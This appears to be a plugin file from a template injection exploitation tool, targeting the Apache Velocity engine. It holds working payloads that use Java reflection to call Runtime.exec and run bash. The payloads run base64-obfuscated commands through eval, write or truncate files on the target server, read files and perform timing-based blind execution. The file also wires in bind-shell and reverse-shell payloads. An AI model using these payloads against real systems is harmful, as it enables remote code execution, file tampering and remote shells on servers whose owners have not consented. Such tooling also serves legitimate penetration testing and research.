from utils.loggers import log
from core.plugin import Plugin
from core import languages
from utils import rand
from utils.strings import quote
import re

class Velocity(Plugin):

    actions = {
        'render' : {
            'render': '#set($c=%(code)s)\n${c}\n',
            'header': '\n#set($h=%(header)s)\n${h}\n',
            'trailer': '\n#set($t=%(trailer)s)\n${t}\n',
            'render_test': '%(n1)s*%(n2)s' % { 
                'n1' : rand.randints[0], 
                'n2' : rand.randints[1]
            },
            'render_expected': '%(res)s' % { 
                'res' : rand.randints[0]*rand.randints[1] 
            }
        },
        'write' : {
            'call' : 'inject',
            'write' : """#set($engine="")
#set($run=$engine.getClass().forName("java.lang.Runtime"))
#set($runtime=$run.getRuntime())
#set($proc=$runtime.exec("bash -c {tr,_-,/+}<<<%(chunk_b64)s|{base64,--decode}>>%(path)s"))
#set($null=$proc.waitFor())
#set($istr=$proc.getInputStream())
#set($chr=$engine.getClass().forName("java.lang.Character"))
#set($output="")
#set($string=$engine.getClass().forName("java.lang.String"))
#foreach($i in [1..$istr.available()])
#set($output=$output.concat($string.valueOf($chr.toChars($istr.read()))))
#end
${output}
""",
            'truncate' : """#set($engine="")
#set($run=$engine.getClass().forName("java.lang.Runtime"))
#set($runtime=$run.getRuntime())
#set($proc=$runtime.exec("bash -c {echo,-n,}>%(path)s"))
#set($null=$proc.waitFor())
#set($istr=$proc.getInputStream())
#set($chr=$engine.getClass().forName("java.lang.Character"))
#set($output="")
#set($string=$engine.getClass().forName("java.lang.String"))
#foreach($i in [1..$istr.available()])
#set($output=$output.concat($string.valueOf($chr.toChars($istr.read()))))
#end
${output}
"""
        },
        'read' : {
            'call': 'execute',
            'read' : """base64<'%(path)s'"""
        },
        'md5' : {
            'call': 'execute',
            'md5': """$(type -p md5 md5sum)<'%(path)s'|head -c 32"""
        },
        'execute' : {

           # This payload cames from henshin's contribution on 
           # issue #9.

            'call': 'render',
            'execute': """#set($engine="")
#set($run=$engine.getClass().forName("java.lang.Runtime"))
#set($runtime=$run.getRuntime())
#set($proc=$runtime.exec("bash -c {eval,$({tr,/+,_-}<<<%(code_b64)s|{base64,--decode})}"))
#set($null=$proc.waitFor())
#set($istr=$proc.getInputStream())
#set($chr=$engine.getClass().forName("java.lang.Character"))
#set($output="")
#set($string=$engine.getClass().forName("java.lang.String"))
#foreach($i in [1..$istr.available()])
#set($output=$output.concat($string.valueOf($chr.toChars($istr.read()))))
#end
${output}
""" 
        },
        'blind' : {
            'call': 'execute_blind',
            'bool_true' : 'true',
            'bool_false' : 'false'
        },
        'execute_blind' : {
            'call': 'inject',
            'execute_blind': """#set($engine="")
#set($run=$engine.getClass().forName("java.lang.Runtime"))
#set($runtime=$run.getRuntime())
#set($proc=$runtime.exec("bash -c {eval,$({tr,/+,_-}<<<%(code_b64)s|{base64,--decode})}&&{sleep,%(delay)s}"))
#set($null=$proc.waitFor())
#set($istr=$proc.getInputStream())
#set($chr=$engine.getClass().forName("java.lang.Character"))
#set($output="")
#set($string=$engine.getClass().forName("java.lang.String"))
#foreach($i in [1..$istr.available()])
#set($output=$output.concat($string.valueOf($chr.toChars($istr.read()))))
#end
${output}
"""
        },
        'bind_shell' : {
            'call' : 'execute_blind',
            'bind_shell': languages.bash_bind_shell
        },
        'reverse_shell' : {
            'call': 'execute_blind',
            'reverse_shell' : languages.bash_reverse_shell
        }
    }

    contexts = [

            # Text context, no closures
            { 'level': 0 },

            { 'level': 1, 'prefix': '%(closure)s)', 'suffix' : '', 'closures' : languages.java_ctx_closures },

            # This catches
            # #if(%s == 1)\n#end
            # #foreach($item in %s)\n#end
            # #define( %s )a#end
            { 'level': 3, 'prefix': '%(closure)s#end#if(1==1)', 'suffix' : '', 'closures' : languages.java_ctx_closures },
            { 'level': 5, 'prefix': '*#', 'suffix' : '#*' },

    ]

    language = 'java'

    def rendered_detected(self):

        expected_rand = str(rand.randint_n(2))
        if expected_rand == self.execute('echo %s' % expected_rand):
            
            self.set('execute', True)
            self.set('write', True)
            self.set('read', True)
            self.set('bind_shell', True)
            self.set('reverse_shell', True)
            
            os = self.execute("""uname""")
            if os and re.search('^[\w-]+$', os):
                self.set('os', os)

    def blind_detected(self):
        # No blind code evaluation is possible here, only execution

        # Since execution has been used to detect blind injection,
        # let's assume execute_blind as set.
        self.set('execute_blind', True)
        self.set('write', True)
        self.set('bind_shell', True)
        self.set('reverse_shell', True)